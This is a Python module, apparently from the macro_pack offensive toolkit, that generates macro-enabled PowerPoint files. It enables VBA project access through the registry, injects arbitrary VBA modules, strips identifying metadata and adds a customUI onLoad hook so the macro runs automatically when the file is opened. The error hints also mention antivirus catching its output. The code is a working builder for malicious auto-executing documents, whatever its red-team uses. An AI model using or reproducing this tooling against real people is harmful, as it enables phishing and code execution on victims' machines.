#!/usr/bin/env python
# encoding: utf-8

# Only enabled on windows
import sys
import os
import shutil
from zipfile import ZipFile
from common.utils import MSTypes
if sys.platform == "win32":
    # Download and install pywin32 from https://sourceforge.net/projects/pywin32/files/pywin32/
    import win32com.client # @UnresolvedImport
    import winreg # @UnresolvedImport

import logging
from common import utils    
from modules.vba_gen import VBAGenerator


class PowerPointGenerator(VBAGenerator):
    """ Module used to generate MS PowerPoint file from working dir content"""
    
    def getAutoOpenVbaFunction(self):
        return "AutoOpen"
    
    def getAutoOpenVbaSignature(self):
        return "Sub AutoOpen()"
    
    
    def enableVbom(self):
        # Enable writing in macro (VBOM)
        # First fetch the application version
        ppt = win32com.client.Dispatch("PowerPoint.Application")
        self.version = ppt.Version
        # IT is necessary to exit office or value wont be saved
        ppt.Quit()
        del ppt
        # Next change/set AccessVBOM registry value to 1
        keyval = "Software\\Microsoft\Office\\"  + self.version + "\\PowerPoint\\Security"
        logging.info("   [-] Set %s to 1..." % keyval)
        Registrykey = winreg.CreateKey(winreg.HKEY_CURRENT_USER,keyval)
        winreg.SetValueEx(Registrykey,"AccessVBOM",0,winreg.REG_DWORD,1) # "REG_DWORD"
        winreg.CloseKey(Registrykey)
        
    
    def disableVbom(self):
        # Disable writing in VBA project
        #  Change/set AccessVBOM registry value to 0
        keyval = "Software\\Microsoft\Office\\"  + self.version + "\\PowerPoint\\Security"
        logging.info("   [-] Set %s to 0..." % keyval)
        Registrykey = winreg.CreateKey(winreg.HKEY_CURRENT_USER,keyval)
        winreg.SetValueEx(Registrykey,"AccessVBOM",0,winreg.REG_DWORD,0) # "REG_DWORD"
        winreg.CloseKey(Registrykey)
    
    
    def _injectCustomUi(self):
        customUIfile = utils.randomAlpha(8)+".xml" # Generally something like customUI.xml
        customUiContent = \
"""<customUI xmlns="http://schemas.microsoft.com/office/2006/01/customui" onLoad="AutoOpen" ></customUI>"""       
        relationShipContent =  \
"""<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties" Target="docProps/core.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/package/2006/relationships/metadata/thumbnail" Target="docProps/thumbnail.jpeg"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="ppt/presentation.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/extended-properties" Target="docProps/app.xml"/><Relationship Id="%s" Type="http://schemas.microsoft.com/office/2007/relationships/ui/extensibility" Target="/customUI/%s" /></Relationships>""" \
 % ("rId5", customUIfile)
        generatedFile = self.outputFilePath
        #  0 copy file to temp dir
        fileCopy = shutil.copy2(generatedFile, self.workingPath)
        # 1 extract zip file in temp working dir
        zipDir = os.path.join(self.workingPath, "zip")
        zipTest = ZipFile(fileCopy)
        zipTest.extractall(zipDir)
        # 2 Set customUi
        customUiDir = os.path.join(zipDir, "customUI")
        if not os.path.exists(customUiDir):
                os.makedirs(customUiDir)
        customUiFile =   os.path.join(customUiDir, customUIfile)      
        with open (customUiFile, "w") as f:
                f.write(customUiContent)
        # 3 Set relationships
        relsFile = os.path.join(zipDir, "_rels", ".rels")
        with open (relsFile, "w") as f:
            f.write(relationShipContent)
        # 3 Recreate archive
        shutil.make_archive(os.path.join(self.workingPath,"rezipped_archive"), format="zip", root_dir=os.path.join(self.workingPath, "zip")) 
        # 4 replace file
        os.remove(generatedFile)
        shutil.copy2(os.path.join(self.workingPath,"rezipped_archive.zip"), generatedFile)
    
    
    def check(self):
        logging.info("   [-] Check feasibility...")
        if utils.checkIfProcessRunning("powerpnt.exe"):
            logging.error("   [!] Cannot generate PowerPoint payload if PowerPoint is already running.")
            if self.mpSession.forceYes or utils.yesOrNo(" Do you want macro_pack to kill PowerPoint process? "):
                utils.forceProcessKill("powerpnt.exe")
            else:
                return False
        try:
            ppt = win32com.client.Dispatch("PowerPoint.Application")
            ppt.Quit()
            del ppt
        except:
            logging.error("   [!] Cannot access PowerPoint.Application object. Is software installed on machine? Abort.")
            return False  
        return True
    
    
    def generate(self):
        
        logging.info(" [+] Generating MS PowerPoint document...")
        try:
            self.enableVbom()
            
            # open up an instance of PowerPoint with the win32com driver
            ppt = win32com.client.Dispatch("PowerPoint.Application")
    
            logging.info("   [-] Open presentation...")
            presentation = ppt.Presentations.Add(WithWindow = False)
            
            self.resetVBAEntryPoint()
            logging.info("   [-] Inject VBA...")
            # Read generated files
            for vbaFile in self.getVBAFiles():
                # Inject all vba files as modules
                with open (vbaFile, "r") as f:
                    macro=f.read()
                    pptModule = presentation.VBProject.VBComponents.Add(1)
                    pptModule.Name = os.path.splitext(os.path.basename(vbaFile))[0]
                    pptModule.CodeModule.AddFromString(macro)
            
            # Remove Informations
            logging.info("   [-] Remove hidden data and personal info...")
            ppRDIAll=99
            presentation.RemoveDocumentInformation(ppRDIAll)
            
            logging.info("   [-] Save presentation...")
            pptXMLFileFormatMap = {".pptm": 25, ".potm": 27}
            if MSTypes.PPT == self.outputFileType:
                presentation.SaveAs(self.outputFilePath, FileFormat=pptXMLFileFormatMap[self.outputFilePath[-5:]])
            # save the presentation and close
            ppt.Presentations(1).Close()
            ppt.Quit()
            # garbage collection
            del ppt
            
            self.disableVbom()
            
            logging.info("   [-] Inject Custom UI...")
            self._injectCustomUi()
               
            logging.info("   [-] Generated %s file path: %s" % (self.outputFileType, self.outputFilePath))
            logging.info("   [-] Test with : \n%s --run %s\n" % (utils.getRunningApp(),self.outputFilePath))
        
        except Exception:
            logging.exception(" [!] Exception caught!")
            logging.error(" [!] Hints: Check if MS office is really closed and Antivirus did not catch the files")
            logging.error(" [!] Attempt to force close MS Powerpoint application...")
            ppt = win32com.client.Dispatch("PowerPoint.Application")
            ppt.Quit()
            # If it Application.Quit() was not enough we force kill the process
            if utils.checkIfProcessRunning("powerpnt.exe"):
                utils.forceProcessKill("powerpnt.exe")
            del ppt
     
        
        